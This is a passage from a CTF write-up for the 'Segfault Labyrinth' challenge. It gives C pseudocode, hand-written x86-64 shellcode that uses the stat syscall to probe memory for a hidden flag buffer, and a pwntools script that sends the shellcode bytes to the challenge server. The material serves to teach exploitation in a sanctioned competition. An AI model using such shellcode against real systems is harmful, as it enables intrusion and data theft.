void pseudo_solution(unsigned long *base /*=RDI*/) {
    unsigned long *level = base;
    int i=0;
    while(i<10) {
        int j=0;
        while(j<16) {
            //careful to not overwrite pointers.
            //Move away from the first 16*8==0x80 bytes of the page.
            int syscall_res = stat("flag.txt", level[j]+0x100);
            if(syscall_res == 0)
                goto breaklabel;
            ++j;
        }
        breaklabel:
        level = level[j];
        ++i;
    }
    write(stdout, level, 0x1000);
}
```

Now, let's convert it into assembly. We will write our shellcode in ghidra (:shrug:):

```asm
**************************************************************
*                          FUNCTION                          *
**************************************************************
undefined shellcode()

/* First we store in base[0x100] the string "flag.txt\x00" */
001011ed 48 89 f8        MOV        RAX,RDI
001011f0 48 05 00        ADD        RAX,0x100
            01 00 00
001011f6 c7 40 00        MOV        dword ptr [RAX],0x67616c66
            66 6c 61 67
001011fd c7 40 04        MOV        dword ptr [RAX + 0x4],0x7478742e
            2e 74 78 74
00101204 c6 40 08 00     MOV        byte ptr [RAX + 0x8],0x0
00101208 49 89 c6        MOV        R14,RAX                         ; R14 = "flag.txt"
0010120b 90              NOP
0010120c 90              NOP
00101220 48 89 fb        MOV        RBX,RDI                         ; level (RBX) = base
00101223 4d 31 ff        XOR        R15,R15                         ; i (R15) = 0

outer_body:
00101226 4d 31 ed        XOR        R13,R13                         ; j (R13) = 0

inner_body:
00101229 49 8d 3e        LEA        RDI,[R14]
0010122c 4a 8b 34 eb     MOV        RSI,qword ptr [RBX + R13*0x8]
00101230 48 81 c6        ADD        RSI,0x100
         00 01 00 00
00101237 48 c7 c0        MOV        RAX,0x4                         ; stat syscall number
         04 00 00 00
0010123e 0f 05           SYSCALL
00101240 48 85 c0        TEST       RAX,RAX
00101243 74 09           JZ         breaklabel
00101245 49 ff c5        INC        R13                             ; j++
00101248 49 83 fd 10     CMP        R13,0x10
0010124c 75 db           JNZ        inner_body

breaklabel:
0010124e 4a 8b 1c eb     MOV        RBX,qword ptr [RBX + R13*0x8]   ; level = level[j]
00101252 49 ff c7        INC        R15                             ; i++
00101255 49 83 ff 0a     CMP        R15,0xa
00101259 75 cb           JNZ        outer_body

/* now perform the write syscall*/
0010125c bf 01 00        MOV        EDI,0x1
         00 00
00101261 48 89 de        MOV        RSI,RBX
00101264 48 c7 c2        MOV        RDX,0x1000
         00 10 00 00
0010126b 48 c7 c0        MOV        RAX,0x1
         01 00 00 00
00101272 0f 05           SYSCALL                                    ; write syscall number

00101274 90              NOP
00101275 f1              INT1                                       ; hardware debug trap
00101276 90              NOP

inf_loop:
00101277 eb fe           JMP        inf_loop
```

So, now we have our full exploit. Let's use [pwntools](https://github.com/Gallopsled/pwntools) to send our exploit:

```python
from pwn import *
context.binary = elfexe = ELF('./challenge')
io = remote('segfault-labyrinth.2022.ctfcompetition.com', 1337)

io.recvline() # Welcome to the Segfault Labyrinth\n
shellcode = b'\x90\x90\x90\x90\x48\x89\xf8\x48\x05\x00\x01\x00\x00\xc7\x40\x00\x66\x6c\x61\x67\xc7\x40\x04\x2e\x74\x78\x74\xc6\x40\x08\x00\x49\x89\xc6\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x48\x89\xfb\x4d\x31\xff\x4d\x31\xed\x49\x8d\x3e\x4a\x8b\x34\xeb\x48\x81\xc6\x00\x01\x00\x00\x48\xc7\xc0\x04\x00\x00\x00\x0f\x05\x48\x85\xc0\x74\x09\x49\xff\xc5\x49\x83\xfd\x10\x75\xdb\x4a\x8b\x1c\xeb\x49\xff\xc7\x49\x83\xff\x0a\x75\xcb\x90\xbf\x01\x00\x00\x00\x48\x89\xde\x48\xc7\xc2\x00\x10\x00\x00\x48\xc7\xc0\x01\x00\x00\x00\x0f\x05\x90\xf1\x90\xeb\xfe'

assert(len(shellcode) > 0 and len(shellcode) < 4051)
io.send(p64(len(shellcode)))
io.send(shellcode)

data = io.recvall(timeout=3)
print(data)
io.close()
```

And we get the flag!

`CTF{c0ngratulat1ons_oN_m4k1nG_1t_thr0uGh_th3_l4Byr1nth}`
